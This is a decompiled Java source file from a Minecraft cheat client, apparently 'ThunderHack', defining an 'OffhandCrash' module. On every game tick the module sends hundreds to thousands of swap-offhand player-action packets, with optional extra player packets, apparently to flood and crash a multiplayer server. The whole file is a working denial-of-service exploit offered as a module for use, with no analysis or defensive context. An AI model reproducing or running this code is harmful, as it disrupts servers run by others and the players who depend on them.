//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "E:\cocaine"!

//Decompiled by Procyon!

package com.mrzak34.thunderhack.module.modules.misc;

import com.mrzak34.thunderhack.module.*;
import com.mrzak34.thunderhack.settings.*;
import net.minecraft.*;

public class OffhandCrash extends Module
{
    NumberSetting switches;
    BooleanSetting playerpackets;
    
    public OffhandCrash() {
        super("OffhandCrash", 0, false, Category.MISC);
        this.switches = new NumberSetting("switches", 420.0f, 0.0f, 2000.0f, false);
        this.playerpackets = new BooleanSetting("player packets", false);
        this.addSettings(new Setting[] { this.switches, this.playerpackets });
    }
    
    public void onTick() {
        super.onTick();
        for (int i = 0; i < this.switches.getValue(); ++i) {
            OffhandCrash.mc.field_1724.field_3944.method_2883((class_2596)new class_2846(class_2846.class_2847.field_12969, class_2338.field_10980, class_2350.field_11033));
            if (this.playerpackets.isEnabled()) {
                OffhandCrash.mc.field_1724.field_3944.method_2883((class_2596)new class_2828.class_5911(true));
            }
        }
    }
}
